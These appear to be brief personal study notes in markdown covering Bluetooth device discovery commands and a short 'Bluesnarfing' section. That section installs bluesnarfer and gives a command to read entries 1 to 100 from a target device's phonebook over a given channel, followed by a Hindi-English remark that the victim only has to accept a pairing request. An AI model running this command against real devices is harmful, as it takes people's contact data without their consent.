
## **Bluetooth**

```
hciconfig
```

First bring interface up

```
hciconfig hci0 up 
```

like we do wlan0 up

```
hcitool scan
```

this gives us mac address

```
hcitool name <mac>
```

This gives us name of the device

```
sdptool browse <mac>
```

We can get more information

GUI version of it

```
btscanner
```

type "i" and we can do inquiry scan

select and press enter to get more information

press "q" to go back to main windows

We can learn about the devices from it

## **Bluesnarfing**

```
sudo apt install bluesnarfer
```

```
bluesnarfer -r 1-100 -C <channel> -b <bid>
```

Pair request aegi

Accept kro aur kaam khtm